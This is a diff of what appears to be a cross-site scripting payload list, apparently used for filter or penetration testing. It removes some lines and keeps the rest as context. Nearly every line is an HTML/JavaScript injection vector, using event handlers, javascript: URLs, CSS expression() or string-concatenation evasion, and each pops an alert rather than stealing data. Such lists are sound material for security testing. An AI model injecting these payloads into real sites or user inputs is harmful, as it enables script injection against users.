@@ -2,17 +2,8 @@
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
-<form><input oninvalid=alert(1) required><input type=submit>
-<a onbeforecopy="alert(1)" contenteditable>test</a>
-<a onbeforecut="alert(1)" contenteditable>test</a>
-<input onchange=alert(1) value=xss>
-<xss onclick="alert(1)" style=display:block>test</xss>
 <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
-<xss oncontextmenu="alert(1)" style=display:block>test</xss>
-<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
-<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
-<body onbeforeprint=console.log(1)>
 <body onbeforeprint=console.log(1)>
 <body onpageshow=alert(1)>
 <body onpopstate=print()>
@@ -60,9 +51,7 @@ alert = window["al"+"ert"]
 <frameset onload="alert('XSS')"></frameset>
 <applet code="javascript:alert('XSS')"></applet>
 <base target="javascript:alert('XSS')">
-<nobr onclick="alert('XSS')">Click me</nobr>
 <plaintext onfocus="alert('XSS')">Focus on me</plaintext>
-<spacer onclick="alert('XSS')">Click me</spacer>
 <span style="width: expression(alert('XSS'));">
 <xml id="xss"><script>alert('XSS')</script></xml>
 <script>alert(document cookie)</script>
@@ -70,7 +59,6 @@ alert = window["al"+"ert"]
 <iframe srcdoc="<script>alert('XSS')"></script>"></iframe>
 <div data-text="&lt;script&gt;alert('XSS')&lt;/script&gt;"></div>
 <input type="text" onfocus="alert('XSS')">
-<button formaction="javascript:alert('XSS')">Click me</button>
 <input type="image" src="invalid" onerror="alert('XSS')">
 <frame src="javascript:alert('XSS');"></frame>
 <object type="text/html" data="javascript:alert('XSS');"></object>
